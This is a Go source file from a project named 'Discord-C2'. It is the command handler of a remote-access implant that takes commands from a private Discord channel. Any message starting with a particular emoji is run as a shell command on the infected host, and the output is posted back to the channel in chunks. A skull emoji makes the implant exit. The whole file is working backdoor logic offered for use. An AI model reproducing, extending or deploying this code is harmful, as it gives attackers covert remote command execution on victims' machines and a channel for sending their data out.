package interactions

import (
	"Discord-C2/config"
	"fmt"
	"os"
	"strings"

	"github.com/bwmarrin/discordgo"
)

func HandleCommand(s *discordgo.Session, m *discordgo.MessageCreate) {

	if m.ChannelID != config.PrivateChan || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐")
	actionCode := 0

	if strings.HasPrefix(m.Content, "🏃‍♂️") {
		command := strings.TrimSpace(strings.TrimPrefix(m.Content, "🏃‍♂️"))

		if command == "" {
			s.ChannelMessageSendReply(m.ChannelID, "❌ Error: Empty command", m.Reference())
			s.MessageReactionAdd(m.ChannelID, m.ID, "❌")
			return
		}

		output, err := ExecuteCommand(command)
		if err != nil {
			output = fmt.Sprintf("Error: %v", err)
		}

		// Handle empty output
		if strings.TrimSpace(output) == "" {
			output = "Command executed successfully with no output."
		}

		// Handle large output
		if len(output) > 1987 {
			chunks := splitLargeOutput(output, 1987)
			for i, chunk := range chunks {
				msgBuilder := strings.Builder{}
				msgBuilder.WriteString(fmt.Sprintf("```\n[Part %d/%d]\n", i+1, len(chunks)))
				msgBuilder.WriteString(chunk + "\n")
				msgBuilder.WriteString("```")
				s.ChannelMessageSendReply(m.ChannelID, msgBuilder.String(), m.Reference())
			}
		} else {
			msgBuilder := strings.Builder{}
			msgBuilder.WriteString("```\n")
			msgBuilder.WriteString(output + "\n")
			msgBuilder.WriteString("```")
			s.ChannelMessageSendReply(m.ChannelID, msgBuilder.String(), m.Reference())
		}

		actionCode = 1
	} else if m.Content == "💀" {
		actionCode = 2
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")

	if actionCode > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if actionCode > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}

// splitLargeOutput divide la salida en partes más pequeñas.
func splitLargeOutput(output string, chunkSize int) []string {
	var chunks []string
	for len(output) > 0 {
		if len(output) < chunkSize {
			chunks = append(chunks, output)
			break
		}
		chunks = append(chunks, output[:chunkSize])
		output = output[chunkSize:]
	}
	return chunks
}
